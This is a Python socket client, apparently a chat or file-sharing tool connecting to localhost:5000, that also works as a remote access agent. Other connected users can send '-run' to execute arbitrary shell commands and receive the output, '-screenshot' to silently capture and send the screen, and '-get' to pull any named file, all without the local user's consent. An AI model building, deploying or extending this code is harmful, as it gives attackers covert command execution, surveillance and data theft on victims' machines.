import socket
import sys
import threading
import argparse
import subprocess
import os
import time
import pyautogui

parser = argparse.ArgumentParser()
parser.add_argument("--name", help="Initial buffer to send")
args = parser.parse_args()

try:
    name = args.name
except Exception:
    print("Please provide a name using --name")
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 5000))
s.send(name.encode("UTF-8"))

name = args.name + "> "

def execute_command(command):
    """
    Выполняет команду и возвращает вывод.
    """

    try:
        output = subprocess.check_output(
            command,
            stderr=subprocess.STDOUT,
            shell=True
        )

    except Exception:
        output = b"Failed to execute command.\n"

    if not output.endswith(b"\n"):
        output += b"\n"

    return output

def transfer_file(priorityname, file_path):

    if not os.path.isfile(file_path):
        print(f"File {file_path} does not exist.")
        return

    file_size = os.path.getsize(file_path)
    filename = os.path.basename(file_path)

    header = f"FILE_TRANSFER {filename} to {priorityname} {file_size}\n"
    s.sendall(header.encode("UTF-8"))

    with open(file_path, "rb") as f:
        #print("SENDING_FILE: ", file_path, "SIZE: ", file_size)
        while True:
            chunk = f.read(4096)

            if not chunk:
                break

            s.sendall(chunk)

def receive_file(client, first_data, filename, file_size):
    received = 0

    with open(filename, "wb") as f:
        file_data = first_data[:file_size]

        f.write(file_data)
        received += len(file_data)

        while received < file_size:
            chunk = client.recv(min(4096, file_size - received))

            if not chunk:
                raise ConnectionError(
                    "Client disconnected during file transfer"
                )

            f.write(chunk)
            received += len(chunk)

    return received

def client_sender():

    while True:
        cmd = input(name)
        if cmd == "":
            continue
        elif cmd == "exit":
            cmd = cmd + "\n"
            s.send(cmd.encode("UTF-8"))
            break
        
        elif cmd.startswith("dataPush"):
            parts = cmd.split()

            if len(parts) < 3:
                print("Usage: dataPush <target> <filename>")
                continue

            op = parts[1]
            filename = parts[2]

            file_path = os.path.join(os.getcwd(), filename)

            if not os.path.isfile(file_path):
                print(f"File not found: {file_path}")
                continue

            transfer_file(op, file_path)
            continue
        cmd = name + cmd + "\n"

        s.send(cmd.encode("UTF-8"))

def receive_cmd_output(client, val):
    buffer = val.encode("UTF-8")

    if b"CMD_OUTPUT_END\n" not in buffer:
        while b"CMD_OUTPUT_END\n" not in buffer:
            chunk = client.recv(1024)
            #print("CHUNK: ", chunk)
            if not chunk:
                raise ConnectionError("Client disconnected during CMD_OUTPUT")

            buffer += chunk
    return buffer.decode("UTF-8", errors="ignore")


def client_listener():
    while True:
        try:
            buffer = s.recv(1024)
            data = buffer.decode("UTF-8", errors="ignore")
            
            # print("DATA: ", data)

            if not buffer:
                break
            if b"CMD_OUTPUT" in buffer:

                data = receive_cmd_output(s, data)

                print(data, end="")
                continue

            elif b"FILE_TRANSFER " in buffer:
                header_end = buffer.find(b"\n")

                if header_end == -1:
                    print("Incomplete FILE_TRANSFER header")
                    continue

                header = buffer[:header_end]
                first_file_data = buffer[header_end + 1:]

                parts = header.decode("UTF-8").split(" ", 2)

                if len(parts) != 3:
                    print("Invalid FILE_TRANSFER header:", header)
                    continue

                filename = parts[1]
                file_size = int(parts[2])


                # print("EXPECTED:", file_size)
                # print("FIRST:", len(first_file_data))

                received = receive_file(
                    s,
                    first_file_data,
                    filename,
                    file_size
                )

                # print("TOTAL RECEIVED:", received)

                continue

            if data.split(" ")[1] == "-run":                
                priorityname = data.split(" ")[0]
                command = data.split(priorityname + " -run ")[1]

                output = execute_command(command)

                message = (
                    name
                    + "CMD_OUTPUT "
                    + priorityname
                    + " "
                    + output.decode("UTF-8", errors="ignore")
                    + "CMD_OUTPUT_END\n"
                )

                s.send(message.encode("UTF-8"))
                continue
            
            elif data.startswith("-screenshot "):
                priority_name = data.split()[1]

                screenshot_path = os.path.join(
                    os.getcwd(),
                    f"screenshot_{int(time.time())}.png"
                )

                try:
                    pyautogui.screenshot().save(screenshot_path)
                    file_size = os.path.getsize(screenshot_path)
                    transfer_file(priority_name, screenshot_path)
                finally:
                    try:
                        os.remove(screenshot_path)
                    except OSError:
                        pass

            elif data.split(" ")[1] == "-get":
                priorityname = data.split(" ")[0]
                filenameWithname = data.split(priorityname + " -get ")[1].strip()
                filename= filenameWithname.split(" ")[1]

                #print(f"Receiving file {filename} from {priorityname}")
                file_path = os.path.join(os.getcwd(), filename)
                #print("FILE_PATH: ", file_path, "FULENAME: ", filename)
                transfer_file(priorityname, file_path)
                #print(f"Sent file {filename} to {priorityname}")
                continue
                

            dataname = data.split(">")[0].strip()
            #print(f"Received from DATANAME: {dataname}")
            if dataname == "" or not ">" in data:
                print(f"\n[ALERT] Received ALERT from server: {data}")
                continue

            if dataname != name[:-2]:
                print(f"\n{data}")

        except Exception as e:
            print(f"\n[ERROR] {e}")
            break

thread = threading.Thread(target=client_listener)
thread2 = threading.Thread(target=client_sender)

thread.start()
thread2.start()